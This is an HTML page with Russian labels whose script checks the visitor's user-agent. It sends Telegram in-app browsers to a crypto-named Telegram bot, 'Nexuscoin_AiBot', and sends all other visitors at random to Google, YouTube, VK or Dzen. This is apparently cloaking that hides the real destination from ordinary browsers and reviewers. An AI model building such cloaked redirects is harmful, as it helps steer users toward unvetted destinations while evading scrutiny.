<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Checking...</title>
</head>
<body>
  <div style="font-family: sans-serif; text-align: center; padding: 20px;">
    <h2>Проверка...</h2>
    <div id="info" style="margin: 20px; padding: 10px; background: #f0f0f0; text-align: left; font-size: 12px;"></div>
    <div id="result" style="margin-top: 20px;"></div>
  </div>

  <script>
    (function() {
      const ua = navigator.userAgent || '';
      const vendor = navigator.vendor || '';
      
      // Показываем информацию
      const infoDiv = document.getElementById('info');
      infoDiv.innerHTML = `
        <strong>User-Agent:</strong> ${ua}<br><br>
        <strong>Vendor:</strong> ${vendor}<br><br>
        <strong>Проверка Telegram:</strong><br>
        - /Telegram/i: ${/Telegram/i.test(ua)}<br>
        - /TelegramBot/i: ${/TelegramBot/i.test(ua)}<br>
        - /android/i: ${/android/i.test(ua)}<br>
        - /wv/: ${/wv/.test(ua)}<br>
      `;
      
      const telegramLink = 'https://t.me/Nexuscoin_AiBot?start=fgdgfd2fe';
      
      const sites = [
        'https://www.google.com',
        'https://www.youtube.com',
        'https://vk.com',
        'https://dzen.ru'
      ];
      
      // 🔥 БОЛЕЕ ШИРОКАЯ проверка для Android Telegram
      const isTelegram = 
        /Telegram/i.test(ua) ||
        /TelegramBot/i.test(ua) ||
        (/Android/i.test(ua) && /wv/.test(ua)) || // Android WebView в Telegram
        (vendor && vendor.includes('Telegram'));
      
      const resultDiv = document.getElementById('result');
      
      if (isTelegram) {
        resultDiv.innerHTML = '<p style="color: green; font-weight: bold;">✅ ОБНАРУЖЕН TELEGRAM!<br>Перенаправление...</p>';
        
        // Пробуем разные способы
        setTimeout(() => {
          window.location.href = telegramLink;
        }, 1000);
        
      } else {
        resultDiv.innerHTML = '<p style="color: orange;">❌ НЕ Telegram<br>Случайный редирект...</p>';
        const randomIndex = Math.floor(Math.random() * sites.length);
        setTimeout(() => {
          window.location.replace(sites[randomIndex]);
        }, 1000);
      }
    })();
  </script>
</body>
</html>
